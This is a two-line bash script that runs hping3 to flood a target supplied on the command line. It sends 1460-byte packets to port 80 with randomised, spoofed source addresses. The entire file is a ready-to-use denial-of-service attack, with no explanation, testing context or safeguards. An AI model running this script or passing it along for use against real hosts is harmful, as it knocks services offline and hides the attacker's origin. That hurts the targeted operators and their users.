#!/bin/bash
hping3 -V -d 1460 --rand-source -p 80 --flood "$1"
